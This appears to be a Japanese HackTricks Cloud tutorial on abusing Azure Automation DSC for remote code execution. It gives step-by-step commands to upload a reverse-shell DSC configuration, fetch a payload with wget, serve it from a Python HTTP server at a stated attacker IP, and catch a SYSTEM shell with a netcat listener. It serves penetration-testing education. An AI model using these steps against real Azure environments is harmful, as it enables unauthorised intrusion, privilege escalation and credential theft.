# Az - State Configuration RCE

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングテクニックを共有してください。

</details>
{% endhint %}

**完全な投稿を確認する: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### リモートサーバー（C2）インフラの準備と手順の概要

#### 概要
このプロセスは、Windows Defenderをバイパスするために設計されたNishangの`Invoke-PowerShellTcp.ps1`ペイロードをホストするリモートサーバーインフラを設定することを含みます。このペイロードは、Kali Linuxマシン（IP `40.84.7.74`）からシンプルなPython HTTPサーバーを使用して提供されます。操作は以下の手順で実行されます：

#### ステップ1 — ファイルの作成
- **必要なファイル:** 2つのPowerShellスクリプトが必要です：
1. `reverse_shell_config.ps1`: ペイロードを取得して実行する望ましい状態構成（DSC）ファイル。[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)から入手できます。
2. `push_reverse_shell_config.ps1`: 構成をVMに公開するスクリプト。[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)で入手できます。
- **カスタマイズ:** これらのファイル内の変数とパラメータは、リソース名、ファイルパス、サーバー/ペイロード識別子など、ユーザー固有の環境に合わせて調整する必要があります。

#### ステップ2 — 構成ファイルの圧縮
- `reverse_shell_config.ps1`を`.zip`ファイルに圧縮し、Azure Storage Accountに転送する準備が整います。
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ステップ3 — ストレージコンテキストの設定とアップロード
- 圧縮された構成ファイルは、AzureのSet-AzStorageBlobContentコマンドレットを使用して、事前定義されたAzure Storageコンテナであるazure-pentestにアップロードされます。
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ステップ 4 — Kaliボックスの準備
- Kaliサーバーは、GitHubリポジトリからRevPS.ps1ペイロードをダウンロードします。
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- スクリプトは、リバースシェルのためのターゲットWindows VMとポートを指定するように編集されます。

#### ステップ5 — 設定ファイルの公開
- 設定ファイルが実行され、リバースシェルスクリプトが指定された場所に展開されます。

#### ステップ6 — ペイロードのホストとリスナーのセットアップ
- Python SimpleHTTPServerが開始され、ペイロードをホストし、着信接続をキャプチャするためのNetcatリスナーも設定されます。
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- 予定されたタスクはペイロードを実行し、SYSTEMレベルの特権を獲得します。

#### 結論

このプロセスの成功した実行は、資格情報のダンプや攻撃を複数のVMに拡大するなど、さまざまな行動の可能性を開きます。このガイドは、Azure Automation DSCの領域での継続的な学習と創造性を奨励しています。

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
